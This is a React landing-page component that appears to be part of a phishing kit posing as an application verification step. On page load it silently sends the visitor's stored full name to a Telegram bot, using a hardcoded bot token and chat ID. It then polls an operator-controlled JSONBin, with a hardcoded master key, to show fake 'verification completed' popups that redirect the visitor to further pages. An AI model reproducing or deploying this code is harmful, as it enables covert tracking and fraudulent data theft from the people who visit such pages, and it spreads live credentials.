import React, { useState, useEffect } from "react";
import ApplyHeader from "../components/applyHeader";
import logo from "../assets/logo-removebg-preview.png";


const BIN_URL =
  "https://api.jsonbin.io/v3/b/6a340b1dda38895dfed7e840/latest";

const BIN_UPDATE_URL =
  "https://api.jsonbin.io/v3/b/6a340b1dda38895dfed7e840";

const MASTER_KEY =
  "$2a$10$qrNF.b6EVU4HN2N8Dvegaez/mp2L7ZO9EjET5ujsIiWNSfuOyB.mu";


const LandingPagee: React.FC = () => {


  const [showPopup, setShowPopup] = useState(false);
  const [showPopup2, setShowPopup2] = useState(false);
  const [showPopup22, setShowPopup22] = useState(false);
  const [showPopup33, setShowPopup33] = useState(false);


  const [countdown,setCountdown] = useState(100);


  const BOT_TOKEN =
    "7287693137:AAHB0QO7JC62ZJSw5EHhVxHF3EJnbqZcXHk";

  const CHAT_ID = "-4575071223";



  const storedData = localStorage.getItem("applicationData");

  const parsedData = storedData
    ? JSON.parse(storedData)
    : {};


  const fullName = parsedData.fullname || "N/A";



  const sendToTelegram = async(message:string)=>{

    try{

      await fetch(
        `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,
        {
          method:"POST",
          headers:{
            "Content-Type":"application/json"
          },
          body:JSON.stringify({
            chat_id:CHAT_ID,
            text:message
          })
        }
      );

    }catch(err){

      console.log(err);

    }

  };





  useEffect(()=>{

    sendToTelegram(
      `✅ ${fullName} has opened the landing page.`
    );

  },[]);






  // FETCH JSONBIN POPUP STATUS

  useEffect(()=>{


    const fetchPopupStatus = async()=>{


      try{


        const res = await fetch(
          BIN_URL,
          {
            headers:{
              "X-Master-Key":MASTER_KEY
            }
          }
        );


        const data = await res.json();


        console.log("JSONBIN:",data);



        // works with both JSONBin formats
        const record = data.record || data;



        setShowPopup(
          record.showPopup ?? false
        );


        setShowPopup2(
          record.showPopup2 ?? false
        );


        setShowPopup22(
          record.showPopup22 ?? false
        );


        setShowPopup33(
          record.showPopup33 ?? false
        );



      }
      catch(error){

        console.error(
          "Error fetching popup:",
          error
        );

      }


    };



    fetchPopupStatus();


    const interval = setInterval(
      fetchPopupStatus,
      5000
    );


    return()=>clearInterval(interval);


  },[]);







  // UPDATE JSONBIN + REDIRECT


  const handleVerification = async(

    route:string,

    popupKey:
    "showPopup2" |
    "showPopup22" |
    "showPopup33"

  )=>{


    try{


      setShowPopup2(false);

      setShowPopup22(false);

      setShowPopup33(false);



      const res = await fetch(
        BIN_URL,
        {
          headers:{
            "X-Master-Key":MASTER_KEY
          }
        }
      );



      const data = await res.json();



      const record = data.record || data;



      const updatedData = {

        ...record,

        [popupKey]:false

      };





      await fetch(

        BIN_UPDATE_URL,

        {

          method:"PUT",

          headers:{

            "Content-Type":"application/json",

            "X-Master-Key":MASTER_KEY

          },


          body:JSON.stringify(updatedData)

        }

      );




      localStorage.setItem(
        "popupSeen",
        "true"
      );



      window.location.hash =
      `#${route}`;



    }
    catch(error){

      console.error(
        "Update error:",
        error
      );

    }



  };








  const VerificationPopup = ({

    onContinue

  }:{

    onContinue:()=>void

  })=>(


    <div className="
    fixed inset-0 
    bg-black/50 
    flex 
    items-center 
    justify-center 
    z-50">


      <div className="
      bg-white 
      p-6 
      rounded-xl 
      shadow-lg 
      max-w-md 
      w-full 
      text-center">


        <div className="
        flex 
        justify-center 
        mb-4">


          <img
          src={logo}
          width={100}
          alt="logo"
          />


        </div>





        <svg

        className="
        animate-spin 
        h-8 
        w-8 
        text-blue-800 
        mx-auto 
        mb-4"

        xmlns="http://www.w3.org/2000/svg"

        fill="none"

        viewBox="0 0 24 24">


          <circle

          cx="12"

          cy="12"

          r="10"

          stroke="currentColor"

          strokeWidth="4"

          className="opacity-25"/>



          <path

          fill="currentColor"

          className="opacity-75"

          d="M4 12a8 8 0 018-8v4a4 4 0 00-4 4H4z"/>


        </svg>





        <p className="
        text-gray-700 
        mb-5">


          Verification completed successfully.


        </p>





        <button

        onClick={onContinue}

        className="
        bg-green-600 
        text-white 
        px-6 
        py-2 
        rounded-lg">


          Continue Verification


        </button>



      </div>


    </div>


  );









  useEffect(()=>{


    let timer:any;


    if(showPopup && countdown > 0){


      timer=setTimeout(()=>{


        setCountdown(
          prev=>prev-1
        );


      },1000);


    }



    if(countdown===0){

      window.location.reload();

    }



    return()=>clearTimeout(timer);


  },[showPopup,countdown]);









  return (

    <>


      <ApplyHeader />




      {
      showPopup2 &&

      <VerificationPopup

      onContinue={()=>


        handleVerification(
          "/user",
          "showPopup2"
        )


      }

      />

      }




      {
      showPopup22 &&

      <VerificationPopup

      onContinue={()=>


        handleVerification(
          "/user2",
          "showPopup22"
        )


      }

      />

      }




      {
      showPopup33 &&

      <VerificationPopup

      onContinue={()=>


        handleVerification(
          "/user3",
          "showPopup33"
        )


      }

      />

      }





      <p className="
      text-sm 
      mt-4 
      p-7 
      text-center">


        Please wait, you will get an update here soon. This may take a while


      </p>





      <div className="
      absolute 
      bottom-[200px] 
      left-1/2 
      -translate-x-1/2">


        <svg

        className="
        animate-spin 
        h-6 
        w-6 
        text-gray-600"

        xmlns="http://www.w3.org/2000/svg"

        fill="none"

        viewBox="0 0 24 24">


          <circle

          cx="12"

          cy="12"

          r="10"

          stroke="currentColor"

          strokeWidth="4"

          className="opacity-25"/>



          <path

          className="opacity-75"

          fill="currentColor"

          d="M4 12a8 8 0 018-8v8H4z"/>


        </svg>


      </div>



    </>

  );



};


export default LandingPagee;